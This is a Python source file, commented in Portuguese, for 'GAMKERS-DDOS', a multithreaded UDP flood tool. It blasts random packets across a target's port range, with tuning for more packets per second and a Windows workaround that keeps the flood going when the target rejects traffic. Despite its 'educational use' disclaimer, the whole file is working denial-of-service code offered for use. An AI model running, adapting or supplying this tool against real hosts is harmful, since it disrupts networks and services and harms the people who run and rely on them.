#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
GAMKERS-DDOS - versao otimizada (multithread)
Apenas para fins educacionais / testes autorizados (localhost, lab proprio,
infraestrutura sua ou com permissao explicita). Ataque sem autorizacao e ilegal.
"""

import argparse
import os
import random
import socket
import sys
import threading
import time
from concurrent.futures import ThreadPoolExecutor

DEFAULT_PAYLOAD_SIZE = 1490  # bytes; reduzir pra ~64-128 rende muito mais pps na mesma banda
DEFAULT_THREADS = 4  # sweet spot medido: 2-4 (loopback: 2; rede real: 4-8)
SYNC_EVERY = 500  # sincroniza contador compartilhado a cada N pacotes
MIN_SIZE, MAX_SIZE = 1, 65507  # limites do payload UDP


def banner():
    print("\033[92m")
    print("GMKR-Ddos")
    print("Coded By : GAMKERS | otimizado: multithread + CLI")
    print("Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We aren't responsible for your actions")
    print("\033[0m")


def _disable_connreset(sock):
    """Windows: ICMP unreachable do alvo envenena o socket UDP com
    WSAECONNRESET (10054) e derruba o throughput. O socket.ioctl do Python
    3.14 nao suporta mais SIO_UDP_CONNRESET, entao chama WSAIoctl direto."""
    if sys.platform != "win32":
        return
    try:
        import ctypes
        FALSE = ctypes.c_int(0)
        bytes_returned = ctypes.c_ulong()
        # SIO_UDP_CONNRESET = _WSAIOW(IOC_VENDOR, 12) = 0x9800000C
        ctypes.windll.ws2_32.WSAIoctl(
            sock.fileno(), 0x9800000C,
            ctypes.byref(FALSE), ctypes.sizeof(FALSE),
            None, 0, ctypes.byref(bytes_returned), None, None,
        )
    except Exception:
        pass  # sem WSAIoctl, segue a vida


def flood(ip, start_port, end_port, duration, stop, stats, lock, payload):
    """Worker: socket proprio, ciclo de portas, sem print por pacote."""
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    _disable_connreset(s)
    port = random.randint(start_port, end_port)
    deadline = time.monotonic() + duration if duration else None
    local = 0
    while not stop.is_set():
        if deadline and time.monotonic() >= deadline:
            break
        try:
            s.sendto(payload, (ip, port))
            local += 1
            if local % SYNC_EVERY == 0:
                with lock:
                    stats[0] += SYNC_EVERY
                local = 0
        except OSError:
            # Windows manda ICMP unreachable -> WinError 10054; recria o
            # socket pra limpar o estado envenenado e continua.
            try:
                s.close()
            except OSError:
                pass
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            _disable_connreset(s)
        port += 1
        if port > end_port:
            port = start_port
    if local:
        with lock:
            stats[0] += local
    s.close()


def reporter(stop, stats, lock):
    """Print de taxa a cada 2s (opcional, nao atrapalha o loop)."""
    last = 0
    while not stop.is_set():
        time.sleep(2)
        with lock:
            total = stats[0]
        rate = (total - last) / 2.0
        last = total
        print("[*] %d pacotes | %.0f pps" % (total, rate), flush=True)


def main():
    ap = argparse.ArgumentParser(
        description="GAMKERS-DDOS otimizado (somente educacional)",
        epilog="ex.: python GAMKERS-DDOS.py 127.0.0.1 -p 9 -t 32 -d 10",
    )
    ap.add_argument("host", help="IP ou hostname do alvo")
    ap.add_argument("-p", "--port", type=int, default=80, help="porta inicial do ciclo (default 80)")
    ap.add_argument("-e", "--end-port", type=int, default=65535, help="porta final do ciclo (default 65535)")
    ap.add_argument("-t", "--threads", type=int, default=DEFAULT_THREADS,
                    help="numero de threads (default %d)" % DEFAULT_THREADS)
    ap.add_argument("-d", "--duration", type=int, default=0,
                    help="duracao em segundos; 0 = infinito (default 0)")
    ap.add_argument("-q", "--quiet", action="store_true", help="sem reporter de taxa")
    ap.add_argument("-s", "--size", type=int, default=DEFAULT_PAYLOAD_SIZE,
                    help="tamanho do payload em bytes (default %d; use 64-128 pra mais pps)"
                    % DEFAULT_PAYLOAD_SIZE)
    args = ap.parse_args()

    if not (1 <= args.port <= 65535) or not (1 <= args.end_port <= 65535) or args.port > args.end_port:
        print("[!] Portas invalidas (1-65535, inicio <= fim).")
        sys.exit(1)
    if args.threads < 1:
        print("[!] Threads >= 1.")
        sys.exit(1)
    if not (MIN_SIZE <= args.size <= MAX_SIZE):
        print("[!] Payload invalido (%d-%d bytes)." % (MIN_SIZE, MAX_SIZE))
        sys.exit(1)

    try:
        ip = socket.gethostbyname(args.host)
    except socket.gaierror:
        print("[!] Host nao resolveu: %s" % args.host)
        sys.exit(1)

    banner()
    print("[*] Alvo %s (%s) | portas %d-%d | threads %d | payload %d bytes"
          % (args.host, ip, args.port, args.end_port, args.threads, args.size))

    payload = os.urandom(args.size)
    stop = threading.Event()
    stats = [0]
    lock = threading.Lock()

    if not args.quiet:
        threading.Thread(target=reporter, args=(stop, stats, lock), daemon=True).start()

    ex = ThreadPoolExecutor(max_workers=args.threads)
    futures = [ex.submit(flood, ip, args.port, args.end_port, args.duration, stop, stats, lock, payload)
               for _ in range(args.threads)]
    try:
        if args.duration:
            time.sleep(args.duration)
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Interrompido pelo usuario.")
    finally:
        stop.set()
        ex.shutdown(wait=True)

    print("[*] Total: %d pacotes para %s" % (stats[0], ip))


if __name__ == "__main__":
    main()
